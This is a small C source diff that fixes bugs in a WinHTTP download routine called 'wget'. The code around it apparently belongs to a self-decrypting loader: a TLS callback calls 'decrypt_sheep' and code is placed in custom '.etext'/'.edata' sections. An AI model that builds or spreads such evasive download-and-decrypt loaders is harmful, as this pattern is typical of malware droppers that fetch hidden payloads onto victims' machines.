@@ -175,7 +175,7 @@ const PIMAGE_TLS_CALLBACK decrypt_callback = decrypt_sheep;
 #pragma code_seg(push, r1, ".etext")
 #pragma const_seg(push, c1, ".edata")
 HINTERNET init_winhttp(void) {
-   return WinHttpOpen(L"Amethyst Labs/1.0"
+   return WinHttpOpen(L"Amethyst Labs/1.0",
                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME,
                       WINHTTP_NO_PROXY_BYPASS,
@@ -195,7 +195,7 @@ uint8_t *wget(HINTERNET session, const wchar_t *verb, const wchar_t *domain, con
                                           verb,
                                           url,
                                           NULL,
-                                          WINHTTP_NO_REFERRER,
+                                          WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
 
@@ -232,11 +232,12 @@ uint8_t *wget(HINTERNET session, const wchar_t *verb, const wchar_t *domain, con
       else
          out_buff = (uint8_t *)realloc(out_buff, *out_size+chunk);
 
-      memset(&sheep_buff[*out_size], 0, chunk);
-      *out_size += chunk;
+      memset(&out_buff[*out_size], 0, chunk);
 
-      if (!WinHttpReadData(request, &out_buff[*out_size-chunk], chunk, &downloaded))
+      if (!WinHttpReadData(request, &out_buff[*out_size], chunk, &downloaded))
          return NULL;
+
+      *out_size += chunk;
 
       if (!WinHttpQueryDataAvailable(request, &chunk))
          return NULL;
